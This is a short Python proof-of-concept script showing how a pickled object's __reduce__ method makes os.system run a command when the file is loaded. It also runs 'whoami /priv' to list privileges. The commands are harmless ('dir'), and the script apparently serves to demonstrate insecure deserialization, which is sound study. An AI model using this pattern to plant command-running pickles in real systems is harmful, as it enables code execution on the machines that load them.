import pickle
import os

os.system("whoami /priv")

class ShellCode():
    def __init__(self, cmd):
        self.cmd = cmd
    
    def __reduce__(self):
        return (os.system, (self.cmd,))


sc = ShellCode("dir")



with open("reducePickle", "wb") as f:
    pickle.dump(sc, f)

with open("reducePickle", "rb") as f:
    pickle.load(f)
    
